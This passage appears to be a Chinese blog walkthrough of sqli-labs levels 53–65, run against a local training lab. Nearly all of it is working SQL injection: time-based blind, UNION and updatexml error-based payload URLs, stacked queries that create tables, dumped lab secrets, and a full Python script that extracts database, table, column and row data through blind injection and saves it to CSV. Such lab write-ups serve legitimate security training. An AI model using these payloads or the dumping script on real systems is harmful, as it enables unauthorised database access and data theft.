title="Less-53"></a>Less-53</h1><p>单引号闭合盲注</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-53/?sort=1&#x27;+and+if(1=2,1,sleep(1))--+<br>/Less-53/?sort=1&#x27;;CREATE+TABLE+less53+LIKE+users;--+<br></code></pre></td></tr></table></figure><h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-54/?id=2333&#x27;+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()--+<br># VYAEEGO9NL<br>/Less-54/?id=2333&#x27;+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#x27;VYAEEGO9NL&#x27;--+<br>#id,sessid,secret_F8S3,tryy<br>/Less-54/?id=2333&#x27;+union+select+1,group_concat(sessid),group_concat(secret_F8S3)+from+challenges.VYAEEGO9NL--+<br># 2b1905b5d4641830901acf76c957cfb1    K20JJt6VubHVKBFPpr5ryE1N<br></code></pre></td></tr></table></figure><h1 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h1><p>与54相比闭合不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-55/?id=2333)+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()--+<br># FK8M4YR08K<br>/Less-55/?id=2333)+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#x27;FK8M4YR08K&#x27;--+<br># id,sessid,secret_A3C2,tryy<br>/Less-55/?id=2333)+union+select+1,group_concat(sessid),group_concat(secret_A3C2)+from+challenges.FK8M4YR08K--+<br># 871a2835d3452d5a3b863312f8ce4273 JZKD4PNgQmJuRDdFLmXI8Nzc<br></code></pre></td></tr></table></figure><h1 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h1><p>与54相比闭合不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-56/?id=233&#x27;)+union+select+1,2,3--+<br></code></pre></td></tr></table></figure><h1 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h1><p>与54相比闭合不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-57/?id=2333&quot;+union+select+1,2,3--+<br></code></pre></td></tr></table></figure><h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><p>有报错信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-58/index.php?id=1&#x27;+and+updatexml(1,concat(0x7e,database()),1)--+<br></code></pre></td></tr></table></figure><h1 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h1><p>与58相比闭合不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-59/index.php?id=1+and+updatexml(1,concat(0x7e,database()),1)--+<br></code></pre></td></tr></table></figure><h1 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h1><p>与58相比闭合不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-60/index.php?id=1&quot;)+and+updatexml(1,concat(0x7e,database()),1)--+<br></code></pre></td></tr></table></figure><h1 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h1><p>与58相比闭合不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/Less-61/index.php?id=1&#x27;))+and+updatexml(1,concat(0x7e,database()),1)--+<br></code></pre></td></tr></table></figure><h1 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h1><p>无报错，无回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs python">/Less-<span class="hljs-number">62</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)+and+1=2--+</span><br><span class="hljs-string">import requests</span><br><span class="hljs-string">import csv</span><br><span class="hljs-string">import pandas as pd</span><br><span class="hljs-string"></span><br><span class="hljs-string">host = &quot;http://127.0.0.1&quot;</span><br><span class="hljs-string">path = &quot;/Less-62/index.php&quot;</span><br><span class="hljs-string">url = host + path</span><br><span class="hljs-string">headers = &#123;</span><br><span class="hljs-string">    &quot;Cookie&quot;: &quot;challenge=694306fdfe0ace5a3e1d2efa27ead123; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">proxies = &#123;</span><br><span class="hljs-string">    &#x27;</span>http<span class="hljs-string">&#x27;: &#x27;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8088</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">    &#x27;</span>https<span class="hljs-string">&#x27;: &#x27;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8088</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">want_text = &#x27;</span>Your Login name<span class="hljs-string">&#x27;</span><br><span class="hljs-string">num = 64</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def send_req(params):</span><br><span class="hljs-string">    resp = requests.get(url, headers=headers, params=params, timeout=10, verify=False, allow_redirects=False, proxies=proxies)</span><br><span class="hljs-string">    if want_text in resp.text:</span><br><span class="hljs-string">        return params</span><br><span class="hljs-string">    return None</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># 跑数据库名长度</span><br><span class="hljs-string">database_name_length = 0</span><br><span class="hljs-string">for i in range(num):</span><br><span class="hljs-string">    params = &#123;</span><br><span class="hljs-string">        &#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: f&quot;1&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-keyword">if</span>(length(database())=&#123;i&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)-- <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if send_req(params) is not None:</span><br><span class="hljs-string">        database_name_length = i</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">print(&quot;</span>database_name_length:<span class="hljs-string">&quot;, database_name_length)</span><br><span class="hljs-string"># 跑数据库名</span><br><span class="hljs-string">database_name = &#x27;&#x27;</span><br><span class="hljs-string">for i in range(database_name_length):</span><br><span class="hljs-string">    l = 0</span><br><span class="hljs-string">    r = 127</span><br><span class="hljs-string">    while l &lt; r:</span><br><span class="hljs-string">        mid = int((l+r)/2)</span><br><span class="hljs-string">        params = &#123;</span><br><span class="hljs-string">            &#x27;id&#x27;: f&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=if(ascii(substr(database(),&#123;i + 1&#125;,1))&gt;&#123;mid&#125;,1,2)-- &quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        if send_req(params) is not None:</span><br><span class="hljs-string">            l = mid + 1</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            r = mid</span><br><span class="hljs-string">    database_name += chr(l)</span><br><span class="hljs-string">print(&#x27;</span>database_name:<span class="hljs-string">&#x27;, database_name)</span><br><span class="hljs-string"># database_name = &#x27;</span>security<span class="hljs-string">&#x27;</span><br><span class="hljs-string"># 获取数据库表的数量</span><br><span class="hljs-string">table_counts = 0</span><br><span class="hljs-string">for i in range(num):</span><br><span class="hljs-string">    params = &#123;</span><br><span class="hljs-string">        &#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: f&quot;1&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-keyword">if</span>((select count(*)table_name <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span>)=&#123;i&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)-- <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if send_req(params) is not None:</span><br><span class="hljs-string">        table_counts = i</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">print(&quot;</span>table_counts:<span class="hljs-string">&quot;, table_counts)</span><br><span class="hljs-string"># 循环所有表</span><br><span class="hljs-string">for i in range(table_counts):</span><br><span class="hljs-string">    print(f&quot;</span>No &#123;i + <span class="hljs-number">1</span>&#125; table<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    # 获取表的名称的长度</span><br><span class="hljs-string">    table_name_length = 0</span><br><span class="hljs-string">    for j in range(num):</span><br><span class="hljs-string">        params = &#123;</span><br><span class="hljs-string">            &#x27;id&#x27;: f&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=if((select length(table_name) from information_schema.tables where table_schema=&#x27;</span>&#123;database_name&#125;<span class="hljs-string">&#x27; limit &#123;i&#125;,1)=&#123;j&#125;,1,2)-- &quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        if send_req(params) is not None:</span><br><span class="hljs-string">            table_name_length = j</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">    print(&quot;\ttable_name_length:&quot;, table_name_length)</span><br><span class="hljs-string">    # 跑表的名称</span><br><span class="hljs-string">    table_name = &#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">    for j in range(table_name_length):</span><br><span class="hljs-string">        l = 0</span><br><span class="hljs-string">        r = 127</span><br><span class="hljs-string">        while l &lt; r:</span><br><span class="hljs-string">            mid = int((l + r) / 2)</span><br><span class="hljs-string">            params = &#123;</span><br><span class="hljs-string">                &#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: f&quot;1&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select table_name <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span> limit &#123;i&#125;,<span class="hljs-number">1</span>),&#123;j + <span class="hljs-number">1</span>&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)-- <span class="hljs-string">&quot;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            if send_req(params) is not None:</span><br><span class="hljs-string">                l = mid + 1</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                r = mid</span><br><span class="hljs-string">        table_name += chr(l)</span><br><span class="hljs-string">    print(&#x27;\ttable_name:&#x27;, table_name)</span><br><span class="hljs-string">    # 跑表的字段数量</span><br><span class="hljs-string">    column_counts = 0</span><br><span class="hljs-string">    for j in range(num):</span><br><span class="hljs-string">        params = &#123;</span><br><span class="hljs-string">            &#x27;id&#x27;: f&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=if((select count(column_name) from information_schema.columns where table_schema=&#x27;</span>&#123;database_name&#125;<span class="hljs-string">&#x27; and table_name=&#x27;</span>&#123;table_name&#125;<span class="hljs-string">&#x27;)=&#123;j&#125;,1,2)-- &quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        if send_req(params) is not None:</span><br><span class="hljs-string">            column_counts = j</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">    print(&quot;\tcolumn_counts:&quot;, column_counts)</span><br><span class="hljs-string">    column_data = &#123;&#125;</span><br><span class="hljs-string">    for j in range(column_counts):</span><br><span class="hljs-string">        print(f&quot;\tNo &#123;j + 1&#125; column&quot;)</span><br><span class="hljs-string">        # 跑字段名的长度</span><br><span class="hljs-string">        column_name_length = 0</span><br><span class="hljs-string">        for k in range(num):</span><br><span class="hljs-string">            params = &#123;</span><br><span class="hljs-string">                &#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: f&quot;1&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-keyword">if</span>((select length(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=<span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;&#123;table_name&#125;&#x27;</span> limit &#123;j&#125;,<span class="hljs-number">1</span>)=&#123;k&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)-- <span class="hljs-string">&quot;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            if send_req(params) is not None:</span><br><span class="hljs-string">                column_name_length = k</span><br><span class="hljs-string">                break</span><br><span class="hljs-string">        print(&quot;</span>\t\tcolumn_name_length:<span class="hljs-string">&quot;, column_name_length)</span><br><span class="hljs-string">        # 跑字段名</span><br><span class="hljs-string">        column_name = &#x27;&#x27;</span><br><span class="hljs-string">        for k in range(column_name_length):</span><br><span class="hljs-string">            l = 0</span><br><span class="hljs-string">            r = 127</span><br><span class="hljs-string">            while l &lt; r:</span><br><span class="hljs-string">                mid = int((l + r) / 2)</span><br><span class="hljs-string">                params = &#123;</span><br><span class="hljs-string">                    &#x27;id&#x27;: f&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>&#123;database_name&#125;<span class="hljs-string">&#x27; and table_name=&#x27;</span>&#123;table_name&#125;<span class="hljs-string">&#x27; limit &#123;j&#125;,1),&#123;k + 1&#125;,1))&gt;&#123;mid&#125;,1,2)-- &quot;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string">                if send_req(params) is not None:</span><br><span class="hljs-string">                    l = mid + 1</span><br><span class="hljs-string">                else:</span><br><span class="hljs-string">                    r = mid</span><br><span class="hljs-string">            column_name += chr(l)</span><br><span class="hljs-string">        print(&#x27;</span>\t\tcolumn_name:<span class="hljs-string">&#x27;, column_name)</span><br><span class="hljs-string">        # 跑字段数据的数量</span><br><span class="hljs-string">        data_counts = 0</span><br><span class="hljs-string">        for k in range(num):</span><br><span class="hljs-string">            params = &#123;</span><br><span class="hljs-string">                &#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: f&quot;1&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-keyword">if</span>((select count(&#123;column_name&#125;) <span class="hljs-keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;)=&#123;k&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)-- <span class="hljs-string">&quot;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            if send_req(params) is not None:</span><br><span class="hljs-string">                data_counts = k</span><br><span class="hljs-string">                break</span><br><span class="hljs-string">        print(&quot;</span>\t\tdata_counts:<span class="hljs-string">&quot;, data_counts)</span><br><span class="hljs-string">        data_list = []</span><br><span class="hljs-string">        for k in range(data_counts):</span><br><span class="hljs-string">            # 跑字段数据的长度</span><br><span class="hljs-string">            data_length = 0</span><br><span class="hljs-string">            for m in range(num):</span><br><span class="hljs-string">                params = &#123;</span><br><span class="hljs-string">                    &#x27;id&#x27;: f&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=if((select length(&#123;column_name&#125;) from &#123;database_name&#125;.&#123;table_name&#125; limit &#123;k&#125;,1)=&#123;m&#125;,1,2)-- &quot;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string">                if send_req(params) is not None:</span><br><span class="hljs-string">                    data_length = m</span><br><span class="hljs-string">                    break</span><br><span class="hljs-string">            print(&quot;\t\t\tdata_length:&quot;, data_length)</span><br><span class="hljs-string">            # 跑字段数据</span><br><span class="hljs-string">            data = &#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">            for m in range(data_length):</span><br><span class="hljs-string">                l = 0</span><br><span class="hljs-string">                r = 127</span><br><span class="hljs-string">                while l &lt; r:</span><br><span class="hljs-string">                    mid = int((l + r) / 2)</span><br><span class="hljs-string">                    params = &#123;</span><br><span class="hljs-string">                        &#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: f&quot;1&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select &#123;column_name&#125; <span class="hljs-keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125; limit &#123;k&#125;,<span class="hljs-number">1</span>),&#123;m+<span class="hljs-number">1</span>&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)-- <span class="hljs-string">&quot;</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string">                    if send_req(params) is not None:</span><br><span class="hljs-string">                        l = mid + 1</span><br><span class="hljs-string">                    else:</span><br><span class="hljs-string">                        r = mid</span><br><span class="hljs-string">                data += chr(l)</span><br><span class="hljs-string">            print(&#x27;\t\t\tdata:&#x27;, data)</span><br><span class="hljs-string">            data_list.append(data)</span><br><span class="hljs-string">        column_data[column_name] = data_list</span><br><span class="hljs-string">    dataframe = pd.DataFrame(column_data)</span><br><span class="hljs-string">    dataframe.to_csv(f&#x27;&#123;database_name&#125;.&#123;table_name&#125;.csv&#x27;, index=False)</span><br></code></pre></td></tr></table></figure><h1 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h1><p>与62相比闭合不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/Less-<span class="hljs-number">63</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;+and+1=2--+</span><br></code></pre></td></tr></table></figure><h1 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h1><p>与62相比闭合不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/Less-<span class="hljs-number">64</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>))+<span class="hljs-keyword">and</span>+<span class="hljs-number">1</span>=<span class="hljs-number">2</span>--+<br></code></pre></td></tr></table></figure><h1 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h1><p>与62相比闭合不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/Less-<span class="hljs-number">65</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&quot;)+and+1=2--+</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
